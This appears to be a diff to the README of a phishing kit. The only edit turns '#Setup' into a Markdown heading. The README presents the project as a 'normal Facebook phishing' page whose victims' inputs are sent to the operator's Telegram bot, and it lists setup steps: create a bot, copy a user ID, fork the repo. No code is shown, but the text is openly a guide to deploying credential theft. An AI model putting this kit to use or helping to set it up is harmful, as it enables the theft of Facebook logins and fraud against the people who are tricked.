@@ -2,7 +2,7 @@
 
 This is a normal Facebook phishing.  Here the victim's inputs will show in your Telegram bot
 
-#Setup 
+## Setup 
 1. Go to Telegra and create a [Bot](https://t.me/BotFather).
 2. Copy your User ID from [Get User ID](https://t.mechatIDrobot).
 3. Fork this repo and take it in your repo.
